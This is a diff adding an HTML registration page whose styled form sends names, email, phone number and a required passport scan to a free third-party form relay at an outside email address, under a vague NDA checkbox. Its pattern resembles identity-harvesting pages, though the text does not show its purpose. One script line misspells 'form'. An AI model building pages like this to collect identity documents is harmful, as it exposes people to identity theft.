@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+
+
+
+    <style>
+        *{
+            margin: 0; padding: 0;
+            box-sizing: border-box;
+            transition: all .2s linear;
+        }
+
+        .form-container{
+            min-height: 100vh;
+            display:flex ;
+            align-items:center ;
+            justify-content: center;
+            background: url(bg2.jpg) no-repeat;
+            background-size: cover;
+            background-position: center;
+            
+        }
+        .form-container form{
+            height: 575px;
+            width: 350px;
+            background: #7e4a4a;
+            text-align: center;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px black;
+            border-top: 1px solid #8e7f7f;
+            border-left: 1px solid #8e7f7f;
+            backdrop-filter: blur(10px);
+            
+            
+
+
+        }
+        .form-container form h3{
+            font-size: 30px;
+            padding:30px 0;
+            letter-spacing: 3px;
+        }
+
+        .form-container form i{
+            padding: 0 5px;
+            font-size: 20px;
+            color: #bbb;
+
+        }
+        .form-container form .gg{
+            outline: none;
+            border: none;
+            height: 40px;
+            width: 82%;
+            background: rgb(255, 255, 255);
+            color: rgb(0, 0, 0);
+            box-shadow: 0 0 5px rgba(0,0,0,5) inset;
+            font-size: 17px;
+            padding: 0 10px;
+            letter-spacing: 1px;
+            border-radius: 10px;
+            margin-left: -10px;
+
+        }
+        .form-container form input[type="submit"]{
+            width:84% ;
+            cursor: pointer;
+            background: linear-gradient(90deg, silver, rgb(199, 2, 2));
+            margin-top: 30px;
+            border-radius: 50px;
+            /*margin-left: 35px;*/
+
+
+        }
+        .mm{
+            margin-right: 310px;
+            margin-left: 33px;
+        }
+        .tt{
+            color: white;
+            font-size: 12px;
+            text-align: justify;
+            
+            margin-top: -18px;
+            margin-left: 55px;
+        }
+        .gg1{
+            outline: none;
+            border: none;
+            height: 40px;
+            width: 82%;
+           
+            
+            font-size: 17px;
+            padding: 0 10px;
+            letter-spacing: 1px;
+            border-radius: 10px;
+
+        }
+
+
+    </style>
+
+    <link rel="stylesheet" href="font-awesome.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <title>Register-From</title>
+</head>
+<body>
+    <div class="form-container">
+        <form target="_blank" action="https://formsubmit.co/info@sbcultim.ae"  id="form" method="post" enctype="multipart/form-data">
+            <h3>Details</h3>
+            
+            <i class=""></i>
+            <input class="gg" type="text" placeholder="First Name" name="name1" required>
+            <br><br><br>
+            <i class=""></i>
+            <input class="gg" type="text" placeholder="Last Name" name="name2" required>
+            <br><br><br>
+            <i class=""></i>
+            <input class="gg" type="email" placeholder="email" name="email" required>
+            <input class="gg" type="hidden" placeholder="email" link="https://index987.netlify.app/" required>
+            
+            <br><br><br>
+            <i class=""></i>
+            <input class="gg" type="tel" placeholder="Phone Number" name="telephone" required>
+            <br><br>
+            <i class=""></i>
+            <input class="gg1" type="file" placeholder=" " name="Passport" required>
+            <br>
+            <input class="mm" type="checkbox" name="I agree" required>
+            <div class="tt">
+                <p>By checking this box, you agree to our NDA, indicating <br> you  understand and commit to abide by its T&Cs.</p></div>
+            <input class="gg" type="submit" value="Continue" required>
+            <a href="https://index987.netlify.app/"><input link="https://index987.netlify.app/" type="hidden" name="_autoresponse" value="your custom message"></a>
+
+            
+        </form>
+
+    </div>
+
+    <SCript>
+        var form = document.getElementById('form')
+        form.addEventListener('mousemove',(e)=>{
+            var x = (window.innerWidth / 2 - e.pageX) / 30;
+            var y = (window.innerWidth / 2 - e.pageY) / 30;
+
+            form.style.transform = 'rotateX('+ x +'deg) rotateY('+ y +'deg)';
+
+
+        });
+        from.addEventListener('mouseleave',function(){
+            form.style.transform = 'rotateX(0deg) rotateY(0deg)';
+
+        });
+
+    </SCript>
+</body>
+</html>
